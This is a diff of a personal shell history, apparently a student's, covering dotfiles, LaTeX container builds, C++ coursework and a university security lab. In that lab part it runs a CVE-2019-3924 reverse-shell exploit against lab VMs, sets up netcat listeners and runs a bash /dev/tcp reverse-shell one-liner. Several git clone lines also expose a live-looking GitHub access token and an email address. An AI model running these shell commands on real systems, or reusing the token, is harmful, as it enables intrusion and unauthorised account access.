-sudo pacman -S python3-mypy
-sudo pacman -S mypy
-sudo pacman -S python3-types-pyyaml
-jvim gradients.ipynb
-j prac
-j Downloads
-ls
-cd prac
-ls
-jvim gradients.ipynb
-cd dotfiles/local/share/venvs
-ls
-cd jupyter_venv
-ls
-la bin
-v dotfiles/scripts/install_arch.sh
-\rm -r ~/dotfiles/local/share/nvim/lazy/jupynium.nvim
-\rm -fr ~/dotfiles/local/share/nvim/lazy/jupynium.nvim
-jvim gradients.ipynb
-jvim gradients.ipynb
-v temp/html.html
-convim
-la
-\rm -r .npm
-la
-yay bun
-yay deno
-v
-convim
-sudo pacman -S deno
-v dotfiles/scripts/install_arch.sh
-node -h
-sudo pacman -Rns nodejs
-la
-deno completions zsh > .local/share/zsh/zfunc/_deno
-v .local/share/zsh/zfunc/_deno
-v .local/share/zsh/zfunc/_cargo
-v .local/share/zsh/zfunc/_deno
-v .local/share/zsh/zfunc/_cargo
-source .local/share/zsh/zfunc/_deno
-compinit -u
-la
-v temp/ts.ts
-convim
-v temp/ts.ts
-v dotfiles/scripts/install_arch.sh
-sudo pacman -S --noconfirm nodejs 
-v temp/ts.ts
-convim
-convim
-python -m venv venv
-source venv/bin/activate
-jvim gradients.ju.py
-j jupyter
-source venv/bin/activate
-source bin/activate
-ls
-ls bin
-jupyter-kernel install --user prac
-jvim gradients.ju.py
-j leave
-ls
-cd Assets
-ls
-fd ju.py
-fd ju
-ls week-A
-ls week-A-files
-fd *ju.py
-fd '*ju.py'
-fd '.*ju.py'
-fd '.*ju\.py'
-find -name ju.py
-fd '.*ju\.py' -r
-fd '.*ju\.py' -R
-fd '.*ju\.py' .
-fd -g '*ju.py' .
-fd -gI '*ju.py' .
-v week-7-string-range/7_string.ju.py
-convim
-v dotfiles/scripts/install_arch.sh
-da
-jvim gradients.ju.py
-which python
-jvim gradients.ju.py
-cd Downloads/prac/venv/bin
-ls
-source activate
-./jupyter-kernel
-pip list | grep numpt
-pip list | grep nump
-pip list | grep sci
-pip list | grep plotly
-pip list | grep nbformat
-cd Downloads/prac/venv/bin
-source activate
-pip list | grep nbformat
-j jupy
-ls
-source bin/activate
-\rm gradients.ju.py
-la
-\rm -r iframe_figures venv .ipynb_checkpoints gradients_DEV.ipynb
-cd Arduino/Projects/01.3_Buzzer
-ls
-v Freenove_4WD_Car_For_ESP32.cpp
-j mmml
-j ucu
-cd mmml
-ls
-jvim Kovalchuk_Husiev_MMML_Lab1.ipynb
-j acs
-ls
-cd lab2-comparison
-ls
-v src/read_run.cpp
-v dotfiles/scripts/install_arch.sh
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-sudo pacman -Syu --noconfirm
-killall zen
-killall zen
-killall zen-beta
-killall zen
-killall -9 zen
 killall -9 zen
 j mmml
 ls
@@ -5392,3 +4282,1096 @@ v src/integrator.cpp
 v src/integrator.cpp
 v src/integrator.cpp
 v src/integrator.cpp
+j cv
+j pers
+cd Drive
+cd Projects
+s
+ls
+cd Life
+ls
+cd cv
+ls
+ll
+j pet
+j pers
+j proj
+j proj
+ls
+cd Personal
+ls
+cd pet.nvim
+ls
+v README.md
+git add .
+git commit -m "Update API info in readme"
+git push
+o main.pdf
+v main.tex
+lvim main.tex
+lvim main.tex
+rubber-info
+v dotfiles/scripts/install_arch.sh
+convim
+ls
+v Dockerfile
+killall lua-language-server
+ls
+podman run --workdir /app --ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium pdflatex
+podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium pdflatex
+ls
+\rm texput.log
+v pdflatex.sh
+chmod +x pdflatex.sh
+mv pdflatex.sh ~/dotfiles/scripts
+convim
+lvim main.tex
+killall knap
+lvim main.tex
+killall pdflatex.sh
+killall pdflatex
+killall pdflatex
+ls
+v texput.log
+lvim main.tex
+lvim main.tex
+killall lua-language-server
+v Dockerfile
+killall nvim
+killall nvim
+v Dockerfile
+pdflatex.sh -h
+podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr --help
+podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr search wallpaper.sty
+podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr info wallpaper.sty
+v Dockerfile
+v dotfiles/scripts/install_arch.sh
+podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr info fontawesome5
+podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr info hyphenat
+podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium rubber-info
+podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium rubber
+podman build --name latex
+podman build --label latex
+podman build . --label latex
+j scri
+v pdflatex.sh
+lvim main.tex
+convim
+j scri
+mv pdflatex.sh latex.sh
+chmod +x latex.sh
+lvim main.tex
+convim
+podman list -a
+podman list
+podman image list
+podman image rm 1033cd59637c
+podman build . --label tex
+j scri
+v latex.sh
+mv latex.sh tex.sh
+lvim main.tex
+podman image list
+alias cppbuild
+podman build . -t tex
+lvim main.tex
+podman ps -a
+podman rm -a
+podman stop -a 
+v tex.sh
+podman rm -a
+v tex.sh
+podman stop -a 
+podman rm -a
+podman ps -a
+killall nvim
+podman stop -a 
+podman rm -a
+ls
+cat texput.log
+lvim main.tex
+cat texput.log
+cat texput.log
+ls
+cat missfont.log
+cat main.log
+ll
+convim
+killall nvim
+lvim main.tex
+convim
+lvim main.tex
+podman ps -a
+podman stop -a --force
+podman rm -a --force
+ll
+lvim main.tex
+ll
+podman rm -a --force
+lvim main.tex
+ll
+ll
+podman rm -a --force
+podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium rubber-info
+v Dockerfile
+v Dockerfile
+podman build . -t tex
+tex.sh rubber
+v tex.sh
+v tex.sh
+tex.sh ls
+v tex.sh
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+tex.sh ls
+v Dockerfile
+podman build . -t tex
+v tex.sh
+tex.sh ls
+tex.sh ls -l
+lvim main.tex
+podman ps -a
+podman rm -a --force
+v tex.sh
+v Dockerfile
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+v Dockerfile
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+lvim main.tex
+v Dockerfile
+podman build . -t tex
+v Dockerfile
+podman build . -t tex
+tex.sh rubber-info
+tex.sh ls ~/.local/bin
+tex.sh sh
+v Dockerfile
+podman build . -t tex
+tex.sh rubber-info
+v Dockerfile
+podman build . -t tex
+tex.sh tlmgr info enumitem
+kil
+killall nvim
+killall knap
+killall lua-language-server
+lvim main.tex
+ll
+o main.pd
+o main.pdf
+o .
+killall nvim
+podman ps -a
+podman rm -a --force
+lvim main.tex
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman attach 6ff142435171
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+lvim main.tex
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+j scr
+v tex.sh
+podman rm -a
+podman rm -a --force
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman inspect --format "{{.Config.Labels}}" 539d94260508
+j scr
+v tex.sh
+podman inspect 539d94260508 --format "{{.State.ExitCode}}"
+podman inspect 539d94260508 --format "{{.Config.Cmd}}"
+podman inspect 539d94260508 --format "{{.Config.Entrypoint}}"
+podman inspect 539d94260508 --format "{{.Config.Labels}}"
+podman ps -a
+podman ps -a
+podman rm -a --force
+v Dockerfile
+lvim main.tex
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+ls
+cp main.tex
+cp main.tex renesas.tex
+lvim renesas.tex
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman rm -a --force
+podman ps -a
+podman ps -a
+podman ps -a
+wpodman rm -a --force
+podman rm -a --force
+podman rm -a --force
+convim
+lvim renesas.tex
+podman rm -a --force
+podman rm -a --force
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman rm -a --force
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+podman rm -a --force
+podman ps -a
+killall lua-language-server
+v texput.log
+ls
+v renesas.log
+ls
+v missfont.log
+convim
+lvim renesas.tex
+podman ps -a
+podman ps -a
+podman ps -a
+podman ps -a
+convim
+lvim renesas.tex
+\rm renesas.tex renesas.out renesas.aux
+la
+\rm renesas.log
+o renesas.pdf
+lvim main.
+lvim main.tex
+po
+podman ps -a
+update
+flatpak --user update -y && flatpak update -y && tldr --update
+yay --noconfirm
+j app
+ls
+o ./ExcalidrawDocker.desktop
+podman ps -a
+j cv
+ls
+v renesas.pdf
+cp main.tex renesas.tex
+lvim renesas.tex
+\rm renesas.tex
+j cv
+mv renesas.pdf husiev_renesas.pdf
+podman network list
+sudo virsh net-autostart default
+sudo virsh net-start default
+j ucu
+ls
+j proj
+j ucu
+cd ucu
+ls
+j pro
+j ucu
+;s
+ls
+mkdir security
+cd security
+mkdir lab1
+cd lab1
+v main.cpp
+mkdir src
+mv main.cpp src
+v CMakeLists.txt
+v CMakeLists.txt
+mkdir poc
+mkdir poc/cve_2019_3924
+mv src CMakeLists.txt poc/cve_2019_3924
+ls
+ls poc/cve_2019_3924
+virsh net-list
+virsh net-info --network default
+cd Downloads
+unzip radyk.zip
+ls
+\rm radyk.zip
+cd lab5-threadpool-integral-semsichko_sen_pakholok
+ls
+o Ѓ�ву�т_thread_pool.pdf
+ranger
+ls
+v readme.md
+mkdir build
+cd build
+cmake ..
+cmake --build .
+v rea
+cd ..
+v readme.md
+ls
+cd ..
+ls
+v CMakeLists.txt
+cd -
+cmake --install .
+cd -
+v CMakeLists.txt
+ls
+cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
+cppbuild lab5check
+cppcompile lab5check -p
+ls
+ls bin
+ls
+ls data
+cppcompile lab5check --s="1 data/func1.cfg 3 7"
+cppcompile lab5check --s="3 data/func3.cfg 3 7"
+v compile.
+v compile.sh
+alias cppcompile
+setarch `uname -m` -R podman run --rm -ti -v .:/app/project:z lab5check --s="3 data/func3.cfg 3 5"
+zshrc
+v ThreadPool.hpp
+v integrate_parallel_tpool.cpp
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/integral/test_integral.py .
+python test_integral.py tpool -C -s -k
+v test_integral.py
+python test_integral.py tpool -C -s -k
+python test_integral.py tpool -C -s -k
+python test_integral.py tpool -C -s -k
+j cpp-
+v compile.sh
+j template
+j template
+j template
+j acs ass
+cd /drive/Projects/ucu/acs/assistance
+ls
+cd template_cpp
+ls
+v compile.sh
+ls
+ls
+python runner.py 2 3 4
+ls
+v add_threadpools_cpp/integrate_simple_tpool.cpp
+ls
+v add_threadpools_cpp/integrate_simple_tpool.cpp
+v CMakeLists.txt
+ls bin
+ls cmake-build-pipeline
+python test_integral.py tpool -C -s -k -h
+python test_integral.py tpool -C -s -k -n simple_tread_pool
+python test_integral.py tpool -C -s -k -n simple_tread_pool
+v temp/py.py
+cd temp
+python -m venv venv
+source venv/bin/activate
+pip install scipy
+v temp/py.py
+v py
+v py.py
+\rm tmp1.py
+v py.py
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u %u @@
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+j appl
+ls
+v net.mullvad.MullvadBrowser.desktop
+xdg-open net.mullvad.MullvadBrowser.desktop
+gio launch net.mullvad.MullvadBrowser.desktop
+o .
+o net.mullvad.MullvadBrowser.desktop
+alias i
+alias o
+zshrc
+xdg-open net.mullvad.MullvadBrowser.desktop
+v net.mullvad.MullvadBrowser.desktop
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u %u @@
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u %u @@
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u %u @@
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u rad1an @@
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+sudo ip link add br0 type bridge
+sudo ip addr add 192.168.0.1/24 dev br0
+sudo ip link set br0 up
+ip addr
+sudoedit /etc/qemu/bridge.conf
+sudo ip link set br0 down
+sudo ip link remove br0
+sudo ip link del br0
+ip addr
+ip addr
+sudo ip addr add 192.168.0.8/24 dev wlan0
+sudo ip addr del 192.168.0.8/24 dev wlan0
+ip addr
+ping 192.168.122.107
+ping 192.168.100.229
+ping 192.168.100.15
+ping 192.168.122.107
+ping 192.168.122.107
+ping 192.168.100.15
+virsh brctl show
+_brctl show
+ip addr
+brctl show
+brctl show
+yay brctl
+virsh net-dhcp-leases network
+virsh net-dhcp-leases
+virsh net-dhcp-leases --network
+virsh net-dhcp-leases --network network
+virsh net-dhcp-leases --h
+virsh net-dhcp-leases --help
+virsh net-list
+virsh net-list
+virsh net-list
+virsh net-list
+virsh net-list
+sudo virsh net-list
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+sudo virsh net-list --all
+sudo virsh net-dumpxml network
+sudo virsh net-dhcp-leases network
+sudo virsh net-dhcp-leases network
+git clone https://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@github.com/anton7811/cybersec20251.git tmp
+git clone https://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@github.com/anton7811/cybersec20251.git tmp
+git clone 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@github.com/anton7811/cybersec20251.git tmp
+v key.txt
+git clone https://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@github.com/anton7811/cybersec20251.git tmp
+EMAIL=husiev.pn@ucu.edu.ua USERNAME=husiev.pn git clone https://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@github.com/anton7811/cybersec20251.git tmp
+git clone https://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@github.com/anton7811/cybersec20251.git tmp
+\rm key.txt
+j securo
+j secur
+ls
+cd lab1
+ls
+v poc/cve_2019_3924/src/main.cpp
+ls
+cd poc
+ls
+cd cve_2019_3924
+ls
+v CMakeLists.txt
+cd ../..
+ls
+la
+cd -
+v CMakeLists.txt
+v src/main.cpp
+cd -
+ls
+unzip tenable\ routeros\ c5d42403135e7d826fbddd85b788401b0f40d90d\ common.zip
+ls
+\rm tenable\ routeros\ c5d42403135e7d826fbddd85b788401b0f40d90d\ common.zip
+ls
+mkdir common
+mv *pp common
+ls
+cd -
+ls
+mkdir build
+cd build
+cmake ..
+cmake --build .
+cd -
+cd ../..
+v common/session.
+v common/session.cpp
+cd -
+v CMakeLists.txt
+v CMakeLists.txt
+cd build
+cmake --build .
+cmake --build .
+v src/main.cpp
+v CMakeLists.txt
+v CMakeLists.txt
+j cpp-
+v CMakeLists.txt
+cmake --build .
+v src/main.cpp
+ls
+ls build
+ls
+ls
+ls build
+./build/nvr_rev_shell
+./build/nvr_rev_shell -h
+v src/main.cpp
+v src/main.cpp
+pwd | wl-copy
+diff /drive/Files/Downloads/lab1/exploit_code/src/main.cpp src/main.cpp
+v src/main.cpp
+v main.cpp
+v src/main.cpp
+cmake --build .
+./nvr_rev_shell -h
+ping 192.168.122.104
+nc
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.104 --listening_port 1337
+mv src/main.cpp src/main_original.cpp
+cp /drive/Files/Downloads/lab1/exploit_code/src/main.cpp .
+cmake --build .
+mv main.cpp src
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.104 --listening_port 1337
+v src/main.cpp
+mv src/main.cpp src/main_petro.cpp
+cp src/main_original.cpp src/main.cpp
+cmake --build .
+v src/main.cpp
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.104 --listening_port 1337
+cp src/main_petro.cpp src/main.cpp
+v src/main.cpp
+cp /drive/Files/Downloads/lab1/exploit_code/passwords.txt build
+v src/main.cpp
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.104 --listening_port 1337
+sudo pacman -S nc
+nc
+netcat
+sudo pacman -S netcat
+nc -lvp 1337
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.101 --listening_port 1337
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.101 --listening_port 1337
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.101 --listening_port 1337
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.122.101 --listening_port 1337
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.122.101 --listening_port 1337
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.122.101 --listening_port 1337
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.122.101 --listening_port 1337
+nc -lvp 1337
+nc -lvnp 1337
+nc -h
+nc -lvp 1337
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+nc -lvp 1337
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+nc -h
+sudo pacman -Rns netcat
+sudo pacman -Rns gnu-netcat
+sudo pacman -S netcat
+nc -lvp 1337
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+nc -lvp 1337
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+bash -i >& /dev/tcp/192.168.0.100/1337 0>&1
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+cmake --build .
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+nc -lvp 1337
+./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
+tcpdump -s 0 -i lo -w attack_capture.pcap
+sudo pacman -S tcpdump
+tcpdump -s 0 -i lo -w attack_capture.pcap
+sudo tcpdump -s 0 -i lo -w attack_capture.pcap
+ls
+\rm attack_capture.pcap
+ls
+scp nvr_rev_shell kali@192.164.122.104:/home/kali/nvr_rev_shell
+ls
+v nvr_rev_shell
+hexdump -C nvr_rev_shell | wl-copy
+v bin.hex
+killall neovim
+killall nvim
+xxd /bin/ls | wl-copy
+xxd nvr_rev_shell | wl-copy
+cp nvr_rev_shell ~/Downloads/tmp
+cp /drive/Projects/ucu/security/lab1 ~/Downloads/tmp/lab1
+cp /drive/Projects/ucu/security/lab1 ~/Downloads/tmp/lab1 -r
+nc -lvp 1337
+flag.txt
+v flag.txt
+/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
+update
+flatpak --user update -y && flatpak update -y && tldr --update
+yay --noconfirm
+ping duck.com
+ping duck.com
+v README.md
+lvim README.md
+yay winbox
+flatpak search winbox
+flatpak install winbox
+yay winbox
+flatpak list --system | grep win
+flatpak list --system | grep Win
+flatpak uninstall com.mikrotik.WinBox
+lvim README.md
+cp src/main.cpp src/main_petro.cpp
+cp src/main_original.cpp src/main.cpp
+v src/main.cpp
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp src/main_original.cpp
+cp src/main_petro.cpp src/main.cpp
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+v src/main.cpp
+cp src/main_original.cpp src/main.cpp
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main_petro.cpp src/main.cpp
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main_original.cpp src/main.cpp
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+sudo rmmod nbd
+yay virtualbox-fuse
+yay vbox-fuse
+yay virtual fuse
+yay vdfuse
+sudo vdfuse -a -f Downloads/U18f_use.vdi /mnt
+ls /mnt
+mkdir U18_mnt
+sudo mount -o loop /mnt/Parition1 U18_mnt
+ls /mnt
+sudo mount -o loop /mnt/Partition1 U18_mnt
+sudo vdfuse -a -f Downloads/U18f_use.vdi /mnt
+sudo umount /mnt
+sudo vdfuse -a -f Downloads/U18f_use.vdi /mnt
+sudo mount -o loop /mnt/Partition1 U18_mnt
+yay -R vdfuse
+yay -Rns qt6-scxml sdl12-compat virtualbox-host-modules-arch virtualbox virtualbox-sdk
+ls
+qemu-img convert -O raw Downloads/U18f_use.vdi U18_mnt
+\rm U18_mnt -r
+qemu-img convert -O raw Downloads/U18f_use.vdi U18_mnt
+v src/main.cpp
+ls
+losetup --find --show U18_mnt
+sudo losetup --find --show U18_mnt
+lsblk
+sudo mount /dev/loop0 /mnt
+ls
+\rm U18_mnt
+qemu-img convert -f vdi -O raw Downloads/U18f_use.vdi U18.img
+ls
+\rm U18.img
+qemu-img convert -f vdi -O raw Downloads/U18f_use.vdi /gamessd/U18.img
+sudo losetup --find --show /gamessd/U18.img
+sudo mount /dev/loop1 /mnt
+lsblk
+mount /gamessd/U18.img /mnt
+sudo mount /gamessd/U18.img /mnt
+ls /gamessd/U18.img
+lsblk
+shai remove loop0 and loop1
+lsblk
+\rm -r /gamessd/U18.img
+cp src/main_original.cpp src/main.cpp
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+v src/main.cpp
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
+\rm src/main_*
+ls
+ls src
+cd ..
+cd ..
+ls
+v common/session.cpp
+j -
+;s
+ls
+cd cve_2019_3924
+v R
+ls
+cd -
+cd ..
+ls
+ls img
+v img/README.md
+cd poc/cve_2019_3924
+ls
+diff src/main.cpp src/main_original.cpp
+v src/main_original.cpp
+v src/main.cpp
+diff src/main.cpp src/main_original.cpp
+mv img/flag.txt img/chr_config.txt img/README.md .
+v README.md
+ls
+v common/LICENSE
+cp ~/Drive/Projects/ucu/acs/assistance/template_cpp/.gitignore .
+v .gitignore
+cd poc/cve_2019_3924
+ls
+\rm -r build
+cd -
+git init
+git add .
+git status
+git commit -m "Add working stuff"
+cd ../..
+mv security sec
+cd sec/lab1
+ls
+git push --set-upstream git@github.com:rhusiev-student/s6_sec_lab1.git main
+ls
+v chr_config.txt
+ls
+v ip_a_ubuntu.txt
+v README.md
+git add .
+git commit -m "Add ip a of ubuntu to readme"
+git push
+v README.md
+git add .
+git commit -m "Add essay to readme"
+git push
+j cpp
+j cpp
+j ucu
+lsu
+ls
+cd cpp
+ls
+mkdir s6_cpp_lab1
+cd s6_cpp_lab1
+ls
+cppproj
+ls
+la
+v
+cd ..
+git clone git@github.com:ucu-cs/lab1-ratio-zaletskyi_husiev.git
+\rm -r lab1-ratio-zaletskyi_husiev/*
+la lab1-ratio-zaletskyi_husiev/
+\rm -r lab1-ratio-zaletskyi_husiev/.github
+cp s6_cpp_lab1/* lab1-ratio-zaletskyi_husiev -r
+ls s6_cpp_lab
+ls s6_cpp_lab1
+ls s6_cpp_lab1 -a
+la lab1-ratio-zaletskyi_husiev/
+\rm -r s6_cpp_lab1
+cd lab1-ratio-zaletskyi_husiev
+ls
+v src/QTheStubborn.cpp
+./compile.sh -d
+ls
+ls cmake-build-debug
+cpplsp
+./compile.sh -d
+./compile.sh -d
+git status
+git add .
+git commit -m "Add a backbone"
+git push
+update
+flatpak --user update -y && flatpak update -y && tldr --update
+yay --noconfirm
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+lsusb
+cd Arduino/Projects
+ls
+git clone https://github.com/arashjafari/audio-to-arduino.git
+cd audio-to-arduino
